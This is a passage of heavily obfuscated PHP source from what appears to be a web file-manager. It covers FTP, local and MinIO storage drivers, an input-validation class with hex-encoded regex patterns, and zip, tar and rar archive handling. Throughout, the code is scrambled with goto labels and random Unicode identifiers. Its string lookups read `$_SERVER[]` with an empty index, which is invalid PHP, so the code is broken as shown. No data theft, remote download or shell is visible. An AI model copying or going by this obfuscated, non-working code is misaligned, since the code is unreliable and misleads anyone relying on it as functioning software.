CURLOPT_RANGE, "{$AڴҦؔ}\x2d{$A񬏡}"); } goto fې䷟; b»̭: } public function upload($Fۆ, $F򧱆, $c֭ = false, $aʫύ = REPEAT_REPLACE) { goto A̞; A˷: $F򧱆 = $this->iconvSystem($F򧱆); $Bȱʅ = ftp_nb_put($this->connect, $Fۆ, $F򧱆, FTP_BINARY); while ($Bȱʅ == FTP_MOREDATA) { $Bȱʅ = ftp_nb_continue($this->connect); } goto d; d: if ($Bȱʅ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Fۆ); goto CԄ; A̞: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Fۆ))) { return !1; } $Fۆ = $this->iconvSystem($Fۆ); goto A˷; CԄ: } public function download($bή, $E۰ = '') { goto cԫ; aΞ: while ($d݉ == FTP_MOREDATA) { $d݉ = ftp_nb_continue($this->connect); } if ($d݉ != FTP_FINISHED) { return !1; } return $this->iconvApp($E۰); goto Fߏߢ; cԫ: if (!$this->_isconn()) { return !1; } $d䩄 = $this->pathFather($E۰); if (!IO::mkdir($d䩄)) { return !1; } goto BЎ; BЎ: $bή = $this->iconvSystem($bή); $E۰ = $this->iconvSystem($E۰); $d݉ = ftp_nb_get($this->connect, $E۰, $bή, FTP_BINARY); goto aΞ; Fߏߢ: } private function ftpList($C) { goto c臐; f: $C = rtrim($C, $d٥[8]) . $d٥[8]; $c֩į = @ftp_nlist($this->connect, $C); if ($c֩į === !1) { $c֩į = @ftp_rawlist($this->connect, $C); foreach ($c֩į as $fߜ => $E呈ډ) { $c֩į[$fߜ] = end(explode($d٥[1143], $E呈ډ)); } } goto aߨ; aߨ: $f撑奥 = array(); foreach ($c֩į as $fƋ) { if ($fƋ == $d٥[91] || $fƋ == $d٥[1144]) { continue; } if (!strstr($fƋ, $d٥[8])) { $fƋ = $C . ltrim($fƋ, $d٥[8]); } $f撑奥[] = $this->iconvApp($fƋ); } return $f撑奥; goto dܒ; c臐: $d٥ =& $_SERVER[]; if (!$this->isFolder($C)) { return !1; } @ftp_chdir($this->connect, $d٥[8]); goto f; dܒ: } private function recursionFtpFiles($Fެ, &$dݾ) { $a =& $_SERVER[]; if (!$this->_isconn()) { return !1; } if (!($A· = $this->ftpList($Fެ))) { return !1; } foreach ($A· as $Fެ) { if ($this->isFolder($Fެ)) { $this->recursionFtpFiles($Fެ, $dݾ); $dݾ[$a[74]][] = $Fެ; } else { $dݾ[$a[73]][] = $Fެ; } } } private function objectMeta($Fב) { goto Aۉ; d޺: if ($Dý !== null && $Dý !== !1) { return $Dý; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $a澧Ǫ[8]); goto b᠊Ҝ; Aۉ: $a澧Ǫ =& $_SERVER[]; $Eݙі = $a澧Ǫ[1145] . md5($Fב); $Dý = Cache::get($Eݙі); goto d޺; b᠊Ҝ: $b = @ftp_size($this->connect, $this->iconvSystem($Fב)); if ($b != -1) { $Dý = array($a澧Ǫ[77] => $b, $a澧Ǫ[29] => $a澧Ǫ[163]); } else { $a̤ = @ftp_chdir($this->connect, $this->iconvSystem($Fב)); $Dý = $a̤ ? array($a澧Ǫ[77] => 0, $a澧Ǫ[29] => $a澧Ǫ[76]) : !1; } Cache::set($Eݙі, $Dý, 0); goto Eۨ; Eۨ: return $Dý; goto b͞ش; b͞ش: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($d) { if (substr($d, 0, 2) == $_SERVER[][1134]) { $d = BASIC_PATH . substr($d, 2); } return $d; } public function iconvApp($D²) { $eǠ =& $_SERVER[]; global $config; return $this->iconvTo($D², $config[$eǠ[1132]], $config[$eǠ[1131]]); } public function iconvSystem($A򽖆) { $D㊣ =& $_SERVER[]; global $config; return $this->iconvTo($A򽖆, $config[$D㊣[1131]], $config[$D㊣[1132]]); } public function getPathOuter($F) { goto eސȎ; A霥: return $this->pathDriver . $A[8] . ltrim($F, $A[8]); goto d; f˙ۂ: if (substr($d̉, 0, 2) == $A[1134]) { $d̉ = BASIC_PATH . substr($d̉, 2); } if (substr($F, 0, 2) == $A[1134]) { $F = BASIC_PATH . substr($F, 2); } $d̉ = KodIO::clear($d̉); goto DԊ; eސȎ: $A =& $_SERVER[]; $d̉ = $this->iconvApp($this->pathBase); $F = $this->iconvApp($F); goto f˙ۂ; DԊ: $F = KodIO::clear($F); $F = substr($F, strlen($d̉)); if (empty($this->pathDriver)) { return $F; } goto A霥; d: } public function mkfile($d, $b = '', $cÝ» = REPEAT_RENAME) { $d = $this->iconvSystem($d); @touch($d); if ($b) { file_put_contents($d, $b); } return is_file($d) ? $this->getPathOuter($d) : !1; } public function mkdir($Dܙ, $Cւ = REPEAT_SKIP) { $Dܙ = $this->iconvSystem($Dܙ); if (is_dir($Dܙ)) { return $this->getPathOuter($Dܙ); } @mkdir($Dܙ, 511, !0); return is_dir($Dܙ) ? $this->getPathOuter($Dܙ) : !1; } public function copyFile($cϏҢ, $a؜) { $this->mkdir($this->pathFather($a؜)); $cϏҢ = $this->iconvSystem($cϏҢ); $a؜ = $this->iconvSystem($a؜); $bݫɌ = @copy($cϏҢ, $a؜); return $bݫɌ ? $this->getPathOuter($a؜) : !1; } public function moveFile($Dݲ, $B˿) { $this->mkdir($this->pathFather($B˿)); $Dݲ = $this->iconvSystem($Dݲ); $B˿ = $this->iconvSystem($B˿); $Fܷ洂 = intval(@rename($Dݲ, $B˿)); if (!$Fܷ洂) { if ($Fܷ洂 = intval(@copy($Dݲ, $B˿))) { @unlink($Dݲ); } } return $Fܷ洂 ? $this->getPathOuter($B˿) : !1; } public function delFile($e) { $e = $this->iconvSystem($e); if (!@unlink($e)) { @chmod($e, 511); if (!@unlink($e)) { return !1; } } else { return !0; } } public function delFolder($E͠) { goto Dؑ; Dؑ: $fуԦ =& $_SERVER[]; $E͠ = $this->iconvSystem($E͠); if (!is_dir($E͠)) { return !0; } goto D슔; fЗ׬: return rmdir($E͠); goto Cﳩҕ; D슔: if (!($c = opendir($E͠))) { return !1; } while (($FĬי = readdir($c)) !== !1) { if ($FĬי == $fуԦ[91] || $FĬי == $fуԦ[1144]) { continue; } $AՈ = $E͠ . $fуԦ[8] . $FĬי; if (!is_dir($AՈ)) { if (!unlink($AՈ)) { chmod($AՈ, 511); if (!unlink($AՈ)) { return !1; } } } else { chmod($AՈ, 511); $AՈ = $this->iconvApp($AՈ); if (!$this->delFolder($AՈ)) { return !1; } } } closedir($c); goto fЗ׬; Cﳩҕ: } public function rename($C󱹸, $F·) { goto b; E: $dʈ = @rename($C󱹸, $bγ); $bγ = $this->iconvApp($bγ); return $dʈ ? $this->getPathOuter($bγ) : !1; goto a; Dû: $C󱹸 = $this->iconvSystem($C󱹸); $F = $this->pathFather($C󱹸); $bγ = rtrim($F, $a[8]) . $a[8] . $aϴ; goto E; b: $a =& $_SERVER[]; $aϴ = $this->fileNameAuto($this->pathFather($C󱹸), $F·); $aϴ = $this->iconvSystem($aϴ); goto Dû; a: } public function size($c˅) { $c˅ = $this->iconvSystem($c˅); return (double) abs(sprintf($_SERVER[][1146], @filesize($c˅))); } public function info($aΜӺ) { $aΜӺ = $this->iconvSystem($aΜӺ); if ($this->isFolder($aΜӺ)) { return $this->folderInfo($aΜӺ); } else { if ($this->isFile($aΜӺ)) { return $this->fileInfo($aΜӺ); } } return !1; } protected function infoChildren($bڄ, &$a, $Bѧɉ = true) { $CԹ =& $_SERVER[]; $bڄ = rtrim($bڄ, $CԹ[8]) . $CԹ[8]; if ($Bѧɉ) { check_abort(); $bڄ = $this->iconvSystem($bڄ); } if (!($Fʲũ = @opendir($bڄ))) { return; } while (($Fۺይ = readdir($Fʲũ)) !== !1) { if ($Fۺይ == $CԹ[91] || $Fۺይ == $CԹ[1144]) { continue; } $Cמ = $bڄ . $Fۺይ; if (is_file($Cמ)) { $a[$CԹ[78]]++; $a[$CԹ[77]] += (double) abs(sprintf($CԹ[1146], @filesize($Cמ))); } else { $a[$CԹ[79]]++; $this->infoChildren($Cמ, $a, !1); } } closedir($Fʲũ); } private function folderInfo($b򊏷, $B،ӝŻ = false) { $a٢ʖ =& $_SERVER[]; $b򊏷 = rtrim($b򊏷, $a٢ʖ[8]) . $a٢ʖ[8]; $F = $this->iconvApp($this->pathThis($b򊏷)); if ($B،ӝŻ) { return array($a٢ʖ[28] => $F, $a٢ʖ[75] => $this->getPathOuter($b򊏷), $a٢ʖ[29] => $a٢ʖ[76]); } $Fמ = array($a٢ʖ[28] => $F, $a٢ʖ[75] => $this->getPathOuter($b򊏷), $a٢ʖ[29] => $a٢ʖ[76], $a٢ʖ[183] => @filectime($b򊏷), $a٢ʖ[106] => @filemtime($b򊏷), $a٢ʖ[1147] => @fileatime($b򊏷), $a٢ʖ[1141] => is_readable($b򊏷), $a٢ʖ[1142] => is_writable($b򊏷), $a٢ʖ[1148] => get_mode($b򊏷)); return $Fמ; } private function fileInfo($F˷, $d = false) { $B㚸 =& $_SERVER[]; $Eڵ = $this->iconvApp($this->pathThis($F˷)); if ($d) { return array($B㚸[28] => $Eڵ, $B㚸[75] => $this->getPathOuter($F˷), $B㚸[29] => $B㚸[163], $B㚸[77] => $this->size($F˷), $B㚸[156] => $this->ext($Eڵ)); } $e = array($B㚸[28] => $Eڵ, $B㚸[75] => $this->getPathOuter($F˷), $B㚸[29] => $B㚸[163], $B㚸[183] => @filectime($F˷), $B㚸[106] => @filemtime($F˷), $B㚸[1147] => @fileatime($F˷), $B㚸[77] => $this->size($F˷), $B㚸[156] => $this->ext($Eڵ), $B㚸[1141] => is_readable($F˷), $B㚸[1142] => is_writable($F˷), $B㚸[1148] => get_mode($F˷)); return $e; } public function exist($cᏋ) { $cᏋ = $this->iconvSystem($cᏋ); return @file_exists($cᏋ); } public function isFile($B) { $B = $this->iconvSystem($B); return @is_file($B); } public function isFolder($Eŋ) { $Eŋ = $this->iconvSystem($Eŋ); return @is_dir($Eŋ); } public function listPath($dؗߑ, $aދ = false) { goto Fɵ; Aإ: $a = array($F[74] => array(), $F[73] => array()); if (!($f = @opendir($dؗߑ))) { return $a; } while (($b҆ = readdir($f)) !== !1) { if ($b҆ == $F[91] || $b҆ == $F[1144]) { continue; } $d = $dؗߑ . $b҆; if (is_file($d)) { $a[$F[73]][] = $this->fileInfo($d, $aދ); } else { $a[$F[74]][] = $this->folderInfo($d, $aދ); } } goto bń; Fɵ: $F =& $_SERVER[]; $dؗߑ = $this->iconvSystem($dؗߑ); $dؗߑ = rtrim($dؗߑ, $F[8]) . $F[8]; goto Aإ; bń: closedir($f); return $a; goto E; E: } public function listAll($d, &$F = array()) { goto F; Eʌ: if (!($A醉 = @opendir($d))) { return $F; } while (($bڞ֍ = readdir($A醉)) !== !1) { if ($bڞ֍ == $CĨ[91] || $bڞ֍ == $CĨ[1144]) { continue; } $fɬ = $d . $bڞ֍; if (is_dir($fɬ)) { $F[] = array($CĨ[75] => $fɬ . $CĨ[8], $CĨ[76] => 1, $CĨ[106] => @filemtime($fɬ), $CĨ[77] => 0); $this->listAll($fɬ, $F); } else { $F[] = array($CĨ[75] => $fɬ, $CĨ[76] => 0, $CĨ[106] => @filemtime($fɬ), $CĨ[77] => $this->size($fɬ)); } } closedir($A醉); goto cާ; cާ: return $F; goto cѱ; F: $CĨ =& $_SERVER[]; $d = $this->iconvSystem($d); $d = rtrim($d, $CĨ[8]) . $CĨ[8]; goto Eʌ; cѱ: } public function has($D籵, $c섧 = false, $e = true) { goto bث; B: if (!($Cݵޮ = @opendir($D籵))) { return !1; } $Bڑ = 0; $F = 0; goto e𬞾; DӉ: return !1; goto Cݷ; bث: $Eٍ =& $_SERVER[]; $D籵 = $this->iconvSystem($D籵); $D籵 = rtrim($D籵, $Eٍ[8]) . $Eٍ[8]; goto B; e𬞾: while (($A = readdir($Cݵޮ)) !== !1) { if ($A == $Eٍ[91] || $A == $Eٍ[1144]) { continue; } $dꍔ = $D籵 . $A; if ($c섧) { if (@is_file($dꍔ)) { $Bڑ++; } else { $F++; } continue; } if ($e) { if (@is_file($dꍔ)) { return !0; } } else { if (@is_dir($dꍔ . $Eٍ[8])) { return !0; } } } closedir($Cݵޮ); if ($c섧) { return array($Eٍ[187] => $Bڑ, $Eٍ[188] => $F); } goto DӉ; Cݷ: } public function hashSimple($c븏ӑ) { goto CЯ; cĄ: return md5($E˂) . $c͖; goto A; a: fseek($a, $c͖ - $Eڃ); $E˂ .= fread($a, $Eڃ); fclose($a); goto cĄ; B: $c͖ = $this->size($c븏ӑ); $Eڃ = 200; $B = 50; goto b; b: if ($c͖ <= $Eڃ * $B) { return $this->hashMd5($c븏ӑ) . $c͖; } $E˂ = $C[33]; $d󡶛 = intval($c͖ / $B); goto C۲; C۲: $a = fopen($c븏ӑ, $C[1149]); if (!$a) { return $E˂; } for ($dߙ = 0; $dߙ < $B; $dߙ++) { fseek($a, $d󡶛 * $dߙ); $E˂ .= fread($a, $Eڃ); } goto a; CЯ: $C =& $_SERVER[]; if (!$c븏ӑ) { return md5($C[33]); } $c븏ӑ = $this->iconvSystem($c븏ӑ); goto B; A: } public function getContent($B) { $B = $this->iconvSystem($B); return file_get_contents($B); } public function setContent($d˳, $D = '') { $d˳ = $this->iconvSystem($d˳); @file_put_contents($d˳, $D, LOCK_EX); clearstatcache(); return strlen($D) == filesize($d˳); } public function fileSubstr($E, $Dǈ = 0, $AɌ = false) { goto aϡǒ; d: return $B; goto cͳ܂; aϡǒ: $cã =& $_SERVER[]; $E = $this->iconvSystem($E); if ($AɌ === !1) { $AɌ = $this->size($E); } goto D; D: if ($AɌ <= 0) { return $cã[33]; } $cӛŮ = fopen($E, $cã[1149]); if (!$cӛŮ) { return !1; } goto F; F: fseek($cӛŮ, $Dǈ); $B = fread($cӛŮ, $AɌ); fclose($cӛŮ); goto d; cͳ܂: } public function upload($a䯤, $E, $fܞ = false, $Eɏڡ̴ = REPEAT_REPLACE) { $Aئ = $this->copyFile($E, $a䯤); return $Aئ ? $this->getPathOuter($a䯤) : !1; } public function download($e, $eƺ) { return $this->iconvSystem($e); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($d̸) { parent::__construct($d̸); $this->signatureVersion($_SERVER[][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto Cꥆ; dՉ: class Input { public static function getArray($f) { goto Dюƿ; fו: if (count($D酎) > 0) { show_json(implode($e[1845], $D酎), !1); } return $A; goto eӄ; Dюƿ: $e =& $_SERVER[]; global $in; $A = array(); goto f䐶Ȗ; f䐶Ȗ: $D酎 = array(); $cߧ = LNG($e[1841]); foreach ($f as $EǨ˵ => $C濛) { goto fÅ; dۇǍ: if (isset($C濛[$e[1844]]) && !self::check($in[$EǨ˵], $C濛[$e[1844]], $BϿ٢)) { if (array_key_exists($e[1843], $C濛)) { if (!is_null($C濛[$e[1843]])) { $A[$bՈ٧] = $C濛[$e[1843]]; } } else { $D酎[] = $F; } continue; } $A[$bՈ٧] = $in[$EǨ˵]; goto F̆; dͰʹł: if (!array_key_exists($EǨ˵, $in)) { if (array_key_exists($e[1843], $C濛)) { if (!is_null($C濛[$e[1843]])) { $A[$bՈ٧] = $C濛[$e[1843]]; } } else { if (isset($C濛[$e[1844]])) { $D酎[] = $F; } } continue; } if (isset($C濛[$e[1844]]) && $C濛[$e[1844]] == $e[278]) { $A = json_decode($in[$EǨ˵], !0); if (is_array($A)) { $A[$bՈ٧] = $A; } else { if (array_key_exists($e[1843], $C濛)) { if (!is_null($C濛[$e[1843]])) { $A[$bՈ٧] = $C濛[$e[1843]]; } } else { $D酎[] = $F; } } continue; } $BϿ٢ = _get($C濛, $e[998]); goto dۇǍ; fÅ: $F = _get($C濛, $e[1225], $cߧ . $e[866] . $EǨ˵); $bՈ٧ = $EǨ˵; if (isset($C濛[$e[1842]]) && $C濛[$e[1842]]) { $bՈ٧ = $C濛[$e[1842]]; } goto dͰʹł; F̆: } goto fו; eӄ: } public static function reg($cԑ = "\162\x65\161\165\151\162\x65") { static $b泘 = array("\162\x65\161\165\x69\x72\145" => "\56\53", "\x6e\165\x6d\142\145\x72" => "\134\x64\x2b", "\x68\145\x78" => "\x5b\60\x2d\71\x41\x2d\x46\141\x2d\146\135\53", "\x69\x6e\x74" => "\133\55\x5c\53\x5d\x3f\x5c\144\53", "\142\157\x6f\x6c" => "\x30\x7c\61", "\x66\154\x6f\141\x74" => "\133\55\134\53\x5d\77\134\144\53\50\134\x2e\134\x64\53\x29\77", "\x65\156\x67\x6c\151\x73\150" => "\133\101\x2d\x5a\x61\55\172\x20\135\x2b", "\143\150\x69\156\145\x73\145" => "\x5b\x5c\170\173\x34\x65\x30\x30\175\55\134\x78\173\71\x66\141\x35\175\x5d\x2b", "\150\x61\163\x43\150\151\x6e\x65\x73\145" => "\x2f\50\133\134\170\x7b\64\x65\x30\x30\175\x2d\x5c\x78\x7b\x39\146\x61\x35\x7d\135\x2b\51\57\165", "\145\155\141\x69\154" => "\134\167\x2b\x28\x5b\134\x2e\x5c\x2d\x5d\x5c\x77\53\x29\x2a\134\100\134\x77\53\x28\133\x5c\x2e\134\x2d\135\x5c\167\53\51\52\x5c\56\134\x77\53", "\160\150\x6f\156\x65" => "\x31\x5b\x33\x2d\71\135\x5c\144\x7b\x39\175", "\164\x65\x6c\160\150\157\x6e\x65" => "\50\134\x28\x5c\x64\x7b\63\54\64\x7d\x5c\51\174\x5c\144\x7b\63\x2c\64\x7d\x2d\174\134\x73\x29\77\134\x64\173\x37\54\x31\64\175", "\165\162\154" => "\50\150\x74\x74\x70\174\146\x74\160\174\x68\x74\x74\x70\x73\51\x3a\x5c\57\134\x2f\133\134\x77\x5c\55\137\135\53\50\x5c\56\x5b\134\x77\x5c\55\137\135\x2b\51\53\x28\133\134\x77\x5c\x2d\134\56\54\x40\77\x5e\x3d\45\x26\72\134\x2f\176\134\53\43\135\x2a\133\x5c\x77\x5c\x2d\134\100\x3f\136\75\45\x26\x5c\57\x7e\134\53\43\x5d\x29\x3f", "\165\x72\154\106\x75\x6c\x6c" => "\x5b\141\x2d\x7a\101\55\x7a\135\x2b\x3a\x5c\x2f\x5c\x2f\133\x5e\134\163\135\52", "\151\160" => "\x28\134\x64\x7b\61\54\x33\x7d\x5c\x2e\51\x7b\63\175\50\x5c\144\x7b\x31\54\63\x7d\51", "\172\151\x70" => "\133\61\x2d\71\x5d\x5c\144\173\x35\x7d\50\x3f\41\134\x64\x29", "\151\144\x43\141\162\144" => "\x28\134\144\173\61\x35\x7d\51\x7c\x28\x5c\144\x7b\61\x37\175\50\134\x64\174\x58\174\x78\x29\51", "\143\157\154\x6f\x72" => "\x23\x28\133\x30\55\x39\x41\55\106\141\55\x66\x5d\173\63\175\174\x5b\x30\55\x39\x41\55\106\x61\x2d\x66\135\173\66\x7d\x29", "\x74\x69\155\145" => "\x28\x5b\x30\55\x31\135\x5c\x64\174\x32\133\60\55\x34\135\51\72\133\x30\55\x35\x5d\x5c\144", "\x64\x61\164\145" => "\134\x64\173\64\175\x5b\x2d\x5c\57\x5d\77\50\60\x5b\x31\x2d\x39\135\x7c\61\x5b\60\55\x32\x5d\x29\133\x2d\x5c\57\x5d\x3f\x28\x5b\x30\55\62\135\x5c\x64\x7c\63\x5b\x30\x2d\x31\x5d\x29", "\x64\x61\x74\x65\x54\x69\155\x65" => "\134\x64\173\64\175\133\x2d\x5c\57\x5d\77\50\x30\x5b\x31\x2d\x39\x5d\174\x31\x5b\x30\x2d\x32\135\x29\x5b\x2d\134\57\135\x3f\50\133\60\55\62\135\x5c\144\x7c\63\133\60\55\61\x5d\51\x5c\x73\x2b\50\x5b\x30\x2d\61\x5d\134\144\174\62\133\x30\55\64\x5d\x29\x3a\133\60\x2d\x35\x5d\x5c\144", "\x70\141\163\163\x77\157\x72\144" => "\x28\77\x3d\56\x2a\134\x64\51\x28\x3f\75\x2e\x2a\133\141\55\x7a\x5d\51\x28\77\75\x2e\52\133\x41\55\x5a\x5d\x29\56\173\x38\54\x32\60\x7d", "\x6b\x65\x79" => "\133\101\55\132\x61\55\172\x30\55\x39\x5f\134\x2d\134\56\x5d\x2b", "\153\x65\171\x46\x75\x6c\154" => "\133\x41\x2d\x5a\141\55\172\60\x2d\71\137\x5c\55\134\x2e\134\163\54\135\x2b"); if (!$cԑ) { return $b泘; } return $b泘[$cԑ]; } public static function check($aݽܻ, $B, $E̻ = null) { $Cݷ =& $_SERVER[]; switch ($B) { case $Cݷ[7]: return in_array($aݽܻ, $E̻); break; case $Cݷ[1846]: return floatval($aݽܻ) > $E̻; break; case $Cݷ[1847]: return floatval($aݽܻ) < $E̻; break; case $Cݷ[321]: return strlen($aݽܻ) >= $E̻[0] && strlen($aݽܻ) <= $E̻[1]; break; case $Cݷ[321]: if (is_array($E̻)) { return strlen($aݽܻ) >= $E̻[0] && strlen($aݽܻ) <= $E̻[1]; break; } else { return strlen($aݽܻ) == $E̻; break; } case $Cݷ[317]: return floatval($aݽܻ) >= $E̻[0] && floatval($aݽܻ) <= $E̻[1]; break; } $dئ = self::reg(!1); $B = isset($dئ[$B]) ? $dئ[$B] : $B; if (substr($B, 0, 1) != $Cݷ[8]) { $B = $Cݷ[1848] . $B . $Cݷ[1849]; } return preg_match($B, $aݽܻ) === 1; } public static function get($C⢝, $D = null, $bÑ = null, $D߻ = null) { goto C΃; b庰: return $AĮ[$C⢝]; goto D돩; C΃: $D屬Ǎ =& $_SERVER[]; $Dԍ򑟴 = array(); if (!is_null($bÑ)) { $Dԍ򑟴[$D屬Ǎ[34]] = $bÑ; } goto E֒; E֒: if (!is_null($D߻)) { $Dԍ򑟴[$D屬Ǎ[998]] = $D߻; } if (!is_null($D)) { $Dԍ򑟴[$D屬Ǎ[1844]] = $D; } $AĮ = Input::getArray(array($C⢝ => $Dԍ򑟴)); goto b庰; D돩: } } class KodArchive { static function init() { goto D; D: $D͖ =& $_SERVER[]; if (defined($D͖[1850])) { return; } define($D͖[1850], SDK_DIR . $D͖[1851]); goto e͋ܩ; Fȑ: require_once ARCHIVE_LIB . $D͖[1858]; require_once ARCHIVE_LIB . $D͖[1859]; require_once ARCHIVE_LIB . $D͖[1860]; goto Bߴ; e͋ܩ: define($D͖[1852], TEMP_FILES); define($D͖[1853], TEMP_FILES); define($D͖[1854], $D͖[1855]); goto AְÄ; AְÄ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $D͖[1856]; require_once ARCHIVE_LIB . $D͖[1857]; goto Fȑ; Bߴ: require_once ARCHIVE_LIB . $D͖[1861]; goto dՈ߰; dՈ߰: } static function checkIfType($B, $cٱ) { goto A˶خ; B: return $Fޗ; goto eԍ; A˶خ: $fۢ =& $_SERVER[]; self::init(); $aɉ = array($fۢ[297] => array($fۢ[297], $fۢ[1862], $fۢ[1863], $fۢ[1864]), $fۢ[1865] => array($fۢ[1865], $fۢ[1866], $fۢ[1030], $fۢ[1028]), $fۢ[1032] => array($fۢ[1032], $fۢ[1867], $fۢ[1868], $fۢ[1869], $fۢ[1870], $fۢ[1871], $fۢ[1872])); goto A; A: $Fޗ = in_array($B, $aɉ[$cٱ]); if ($Fޗ && ($cٱ == $fۢ[297] || $cٱ == $fۢ[1865]) && (!function_exists($fۢ[1873]) || !function_exists($fۢ[1874]))) { show_tips($fۢ[1875]); } if ($Fޗ && $cٱ == $fۢ[1032] && (!function_exists($fۢ[1876]) || !strstr(shell_exec($fۢ[1877]), $fۢ[1878]))) { show_tips($fۢ[1879]); } goto B; eԍ: } static function listContent($F֌⫔, $f = true) { $Eʢ =& $_SERVER[]; self::init(); $FǑ = !empty($GLOBALS[$Eʢ[1036]]) ? $GLOBALS[$Eʢ[1036]] : get_path_ext($F֌⫔); $aӷ޶ = !1; if (self::checkIfType($FǑ, $Eʢ[1865])) { $dܐ = PclTarList($F֌⫔, $FǑ); $aӷ޶ = array(); for ($e = 0; $e < count($dܐ); $e++) { $CĈ = $dܐ[$e]; if ($CĈ[$Eʢ[1880]] == $Eʢ[1881] || $CĈ[$Eʢ[1880]] == $Eʢ[1882]) { continue; } if ($f) { $CĈ[$Eʢ[1883]] = ltrim($CĈ[$Eʢ[1883]], $Eʢ[1134]); } if ($CĈ[$Eʢ[1880]] == $Eʢ[1884]) { $CĈ[$Eʢ[76]] = !0; } else { $CĈ[$Eʢ[76]] = !1; } $CĈ[$Eʢ[1023]] = $e; $aӷ޶[] = $CĈ; } } else { if (self::checkIfType($FǑ, $Eʢ[1032])) { $E鬏 = kodRarArchive::listContent($F֌⫔); if (!$E鬏[$Eʢ[1019]]) { return $E鬏; } else { $aӷ޶ = $E鬏[$Eʢ[1021]]; } } else { if (kodZipArchive::support($Eʢ[350])) { $aӷ޶ = kodZipArchive::listContent($F֌⫔); } else { $Cľ = new PclZip($F֌⫔); $aӷ޶ = $Cľ->listContent(); } } } if ($aӷ޶) { $Aֆǎ = unzip_charset_get($aӷ޶); $f = $f && function_exists($Eʢ[65]); for ($e = 0; $e < count($aӷ޶); $e++) { $aӷ޶[$e][$Eʢ[1883]] = str_replace(array($Eʢ[1059], $Eʢ[1885]), $Eʢ[748], $aӷ޶[$e][$Eʢ[1883]]); if ($f) { $aӷ޶[$e][$Eʢ[1883]] = iconv_to($aӷ޶[$e][$Eʢ[1883]], $Aֆǎ, $Eʢ[322]); unset($aӷ޶[$e][$Eʢ[1886]]); } } return array($Eʢ[1019] => !0, $Eʢ[1021] => $aӷ޶); } else { return array($Eʢ[1019] => !1, $Eʢ[1021] => $aӷ޶); } } static function extract($BƉ, $Fݘ, $aҶ = "\x2d\x31", &$cݝ = false) { goto eٓ; D檳: if (self::checkIfType($b֭ϟ, $eӠ[1865])) { if ($aҶ != $eӠ[1018]) { $A櫾 = unzip_pre_name($A櫾); $Aނ = unzip_pre_name($Aނ); $a𐯢ɬ = PclTarExtractList($BƉ, array($A櫾), $Fݘ, $Aނ, $b֭ϟ); } else { $a𐯢ɬ = PclTarExtract($BƉ, $Fݘ, $eӠ[357], $b֭ϟ); } return array($eӠ[1019] => $a𐯢ɬ, $eӠ[1021] => PclErrorString(!0)); } else { if (self::checkIfType($b֭ϟ, $eӠ[1032])) { return kodRarArchive::extract($BƉ, $Fݘ, $b֭ϟ, $cݝ); } else { if (kodZipArchive::support($eӠ[1887])) { return kodZipArchive::extract($BƉ, $Fݘ, $cݝ); } else { $bʥ = new PclZip($BƉ); if ($aҶ != $eӠ[1018]) { $a𐯢ɬ = $bʥ->extract(PCLZIP_OPT_PATH, $Fݘ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $eӠ[1888], PCLZIP_OPT_BY_NAME, $dю[$eӠ[1883]], PCLZIP_OPT_REMOVE_PATH, $Aނ, PCLZIP_OPT_REPLACE_NEWER); } else { $a𐯢ɬ = $bʥ->extract(PCLZIP_OPT_PATH, $Fݘ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $eӠ[1888], PCLZIP_OPT_REPLACE_NEWER); } return array($eӠ[1019] => $a𐯢ɬ, $eӠ[1021] => $bʥ->errorName(!0)); } } } return array($eӠ[1019] => !1, $eӠ[1021] => $eӠ[1889]); goto a; e۔: $dˣе = self::listContent($BƉ, !1); if (!$dˣе[$eӠ[1019]]) { return $dˣе; } if ($aҶ != $eӠ[1018]) { goto Cɹ; Aʉ: if ($dю[$eӠ[76]]) { $A櫾 = rtrim($A櫾, $eӠ[8]) . $eӠ[8]; $cݝ = array($cݝ); } $f˧ = str_replace($eӠ[93], $eӠ[8], $A櫾); if (substr($f˧, -1) == $eӠ[8]) { if (!strstr(trim($f˧, $eӠ[8]), $eӠ[8])) { $Fݘ = $Fݘ . get_path_this($f˧) . $eӠ[8]; } } else { if ($Aނ == $A櫾) { $Aނ = $eӠ[33]; } } goto A; Cɹ: $dю = self::fileIndex($dˣе[$eӠ[1021]], $aҶ); $cݝ = str_replace(array($eӠ[1059], $eӠ[1885]), $eӠ[70], $dю[$eӠ[1883]]); $A櫾 = $cݝ; goto ǎ; ǎ: if ($GLOBALS[$eӠ[6]][$eӠ[1132]] != $eӠ[322]) { $A櫾 = unzip_pre_name($cݝ); } $Aނ = get_path_father($cݝ); if ($Aނ == $cݝ) { $Aނ = $eӠ[33]; } goto Aʉ; A: } goto D檳; eٓ: $eӠ =& $_SERVER[]; self::init(); $b֭ϟ = !empty($GLOBALS[$eӠ[1036]]) ? $GLOBALS[$eӠ[1036]] : get_path_ext($BƉ); goto e۔; a: } static function fileIndex($Dَ, $f, $E = false) { goto Fź; c: $f = $bτ; if ($E) { $f = $bτ[$E]; if ($bτ[$B콞[76]]) { $f = rtrim($f, $B콞[8]) . $B콞[8]; } } return $f; goto A; Fź: $B콞 =& $_SERVER[]; self::init(); if (!is_array($Dَ)) { return !1; } goto CֿҼ; CֿҼ: $E = count($Dَ); for ($aƆ = 0; $aƆ < $E; $aƆ++) { if ($f == $Dَ[$aƆ][$B콞[1023]]) { $bτ = $Dَ[$aƆ]; break; } } if (!$bτ) { show_tips($B콞[1890]); } goto c; A: } static function extractZipFile($B߬ү, $Cרʍ, $FȆ׎ = false) { goto e̍; e˦: mk_dir($Eݖ); $Dª = $Eݖ . md5($B߬ү . $Cרʍ); if ($FȆ׎) { $Dª = $Eݖ . $FȆ׎; } goto C߷; F֝: $AûĆ = get_path_father($Cרʍ); if ($AûĆ == $Cרʍ) { $AûĆ = $a[33]; } $eߤ = $D->extract(PCLZIP_OPT_PATH, $Eݖ, PCLZIP_CB_PRE_FILE_NAME, $a[1888], PCLZIP_OPT_REMOVE_PATH, $AûĆ, PCLZIP_OPT_BY_NAME, $Cרʍ); goto d҈; d҈: if (!file_exists($c)) { return !1; } 